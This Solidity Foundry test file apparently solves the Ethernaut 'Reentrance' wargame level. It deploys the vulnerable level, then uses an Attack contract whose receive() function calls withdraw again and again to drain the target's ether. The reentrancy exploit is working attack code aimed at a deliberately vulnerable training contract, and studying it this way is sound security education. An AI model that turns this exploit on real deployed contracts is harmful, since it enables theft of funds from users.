// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Reentrance/ReentranceFactory.sol";
import "../src/Ethernaut.sol";

contract ReentranceTest is StdCheats, Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 3 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(reentranceFactory);
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautReentrance)));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() public {
        Reentrance reentrance = Reentrance(payable(target));
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        Reentrance reentrance = Reentrance(payable(target));
        reentrance.withdraw(1 ether);
    }
}
